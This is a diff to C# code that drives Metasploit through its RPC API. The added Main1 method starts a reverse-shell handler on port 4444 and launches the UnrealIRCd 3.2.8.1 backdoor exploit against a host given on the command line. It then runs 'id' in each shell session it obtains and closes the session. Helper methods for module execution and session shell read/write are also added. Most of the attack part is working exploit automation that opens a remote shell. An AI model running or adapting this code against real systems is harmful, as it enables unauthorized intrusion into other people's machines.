@@ -25,6 +25,65 @@ namespace MetasploitAutomatic
                }
                
           }
+
+          static void Main1(string[] args)
+          {
+               string listenAddr = args[1];
+               int listenPort = 4444;
+               string payload = "cmd/unix/reverse";
+
+               using (MetasploitSession session = new MetasploitSession("username","password","http://"+listenAddr+":55553/api"))
+               {
+                    if (string.IsNullOrEmpty(session.Token))
+                         throw new Exception("Login Failed. Check credentials");
+
+                    using (MetasploitManager manager = new MetasploitManager(session))
+                    {
+                         Dictionary<object, object> response = null;
+
+                         Dictionary<object, object> opts = new Dictionary<object, object>();
+                         opts["ExitOnSession"] = false;
+                         opts["PAYLOAD"] = payload;
+                         opts["LHOST"] = listenAddr;
+                         opts["LPORT"] = listenPort;
+
+                         response = manager.ExecuteModule("exploit", "multi/handler", opts);
+                         object jobID = response["job_id"];
+
+                         // Vuln Exploit
+                         opts = new Dictionary<object, object>();
+                         opts["RHOST"] = args[0];
+                         opts["DisablePayloadHandler"] = true;
+                         opts["LHOST"] = listenAddr;
+                         opts["LPORT"] = listenPort;
+                         opts["PAYLOAD"] = payload;
+
+                         manager.ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
+
+                         response = manager.ListJobs();
+                         while (response.ContainsValue("Exploit: unix/irc/unreal_ircd_3281_backdoor"))
+                         {
+                              Console.WriteLine("Waiting");
+                              System.Threading.Thread.Sleep(10000);
+                              response = manager.ListJobs();
+                         }
+
+                         response = manager.StopJob(jobID.ToString());
+
+                         response = manager.ListSessions();
+                         foreach (var pair in response)
+                         {
+                              string sessionID = pair.Key.ToString();
+                              manager.WriteToSessionShell(sessionID, "id\n");
+                              System.Threading.Thread.Sleep(1000);
+                              response = manager.ReadSessionShell(sessionID);
+                              Console.WriteLine("We are user: " + response["data"]);
+                              Console.WriteLine("Killing session: " + sessionID);
+                              manager.StopSession(sessionID);
+                         }
+                    }
+               }
+          }
      }
 
      public class MetasploitSession : IDisposable
@@ -143,6 +202,44 @@ namespace MetasploitAutomatic
           public Dictionary<object,object> ListJobs()
           {
                return _session.Execute("job.list");
+          }
+
+          public Dictionary<object,object> StopJob(string jobID)
+          {
+               return _session.Execute("job.stop", jobID);
+          }
+
+          public Dictionary<object,object> ExecuteModule(string moduleType, string moduleName, Dictionary<object,object> options)
+          {
+               return _session.Execute("module.execute", moduleType, moduleName, options);
+          }
+
+          public Dictionary<object,object> ListSessions()
+          {
+               return _session.Execute("session.list");
+          }
+
+          public Dictionary<object,object> StopSession(string sessionID)
+          {
+               return _session.Execute("session.stop", sessionID);
+          }
+
+          public Dictionary<object,object> ReadSessionShell(string sessionID, int? readPointer = null)
+          {
+               if (readPointer.HasValue)
+                    return _session.Execute("session.shell_read", sessionID, readPointer.Value);
+               else
+                    return _session.Execute("session.shell_read", sessionID);
+          }
+
+          public Dictionary<object,object> WriteToSessionShell(string sessionID, string data)
+          {
+               return _session.Execute("session.shell_write", sessionID, data);
+          }
+
+          public void Dispose()
+          {
+               _session = null;
           }
      }
 
